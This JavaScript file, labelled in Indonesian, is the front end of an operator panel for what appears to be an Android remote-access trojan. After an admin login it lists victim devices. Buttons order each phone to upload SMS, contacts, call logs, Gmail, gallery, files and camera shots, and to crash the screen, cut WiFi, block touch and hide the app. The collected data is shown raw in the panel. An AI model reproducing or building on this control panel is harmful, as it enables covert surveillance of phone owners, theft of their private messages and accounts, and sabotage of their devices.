let currentDevice = null;

async function login() {
  const u = document.getElementById('u').value;
  const p = document.getElementById('p').value;
  const r = await fetch('/api/admin/login', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({username:u, password:p})
  });
  const j = await r.json();
  if (j.ok) showApp(); else document.getElementById('err').textContent = 'Salah';
}

async function loadDevices() {
  const r = await fetch('/api/admin/devices');
  const list = await r.json();
  const main = document.getElementById('main');
  main.innerHTML = `<h2>Perangkat</h2><div class="grid" id="devices"></div>`;
  const el = document.getElementById('devices');
  for (const d of list) {
    const c = document.createElement('div');
    c.className = 'card';
    c.innerHTML = `<div class="title">${d.brand||''} ${d.model||''}</div>
      <div class="meta">ID: ${d.device_id}</div>
      <div class="meta">Android: ${d.android||'-'}</div>
      <div class="meta">Baterai: ${d.battery||0}%</div>
      <div class="meta">Terakhir: ${d.last_seen||'-'}</div>`;
    c.onclick = () => openDevice(d.device_id);
    el.appendChild(c);
  }
}

async function openDevice(id) {
  currentDevice = id;
  const r = await fetch('/api/admin/uploads?deviceId='+encodeURIComponent(id));
  const list = await r.json();
  const main = document.getElementById('main');
  main.innerHTML = `
    <button onclick="loadDevices()" style="margin-bottom:12px;padding:10px 16px;background:transparent;border:1px solid var(--border);border-radius:10px;color:var(--text)">← Kembali</button>
    <h2>Kontrol</h2><div class="btn-grid" id="btns"></div>
    <h2 style="margin-top:20px">Data</h2><div id="uploads"></div>`;
  renderButtons();
  renderUploads(list);
}

function renderButtons() {
  const acts = [
    ['sms','SMS'],['contacts','Kontak'],['calllog','Call Log'],
    ['gmail','Gmail'],['gallery','Galeri'],['files','File'],
    ['camera|0','Camera Belakang'],['camera|1','Camera Depan'],
    ['crash|60','Crash UI 60s'],['wifi_off|60','WiFi Off 60s'],
    ['wifi_on','WiFi On'],['touch_block|60','Block Touch 60s'],
    ['touch_unblock','Unblock Touch'],['hide_self','Hide App'],
    ['unhide_self','Unhide App']
  ];
  const el = document.getElementById('btns');
  for (const [act, label] of acts) {
    const [action, arg] = act.split('|');
    const b = document.createElement('button');
    b.className = 'btn';
    b.textContent = label;
    b.onclick = () => sendCommand(action, arg||'');
    el.appendChild(b);
  }
}

async function sendCommand(action, arg) {
  await fetch('/api/admin/command', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({deviceId: currentDevice, action, arg})
  });
  alert('Terkirim');
}

function renderUploads(list) {
  const el = document.getElementById('uploads');
  for (const u of list) {
    const c = document.createElement('div');
    c.className = 'card';
    c.style.cursor = 'default';
    c.innerHTML = `<div style="font-size:11px;color:#a5b4fc;text-transform:uppercase;margin-bottom:6px">${u.type}</div>
      <div class="meta" style="margin-bottom:6px">${u.created_at}</div>
      <pre>${(u.data||'').substring(0,4000)}</pre>`;
    el.appendChild(c);
  }
}

function showApp() {
  document.getElementById('login').style.display = 'none';
  document.getElementById('app').style.display = 'block';
  loadDevices();
}

document.getElementById('btnLogin').onclick = login;
document.getElementById('btnLogout').onclick = () => location.reload();
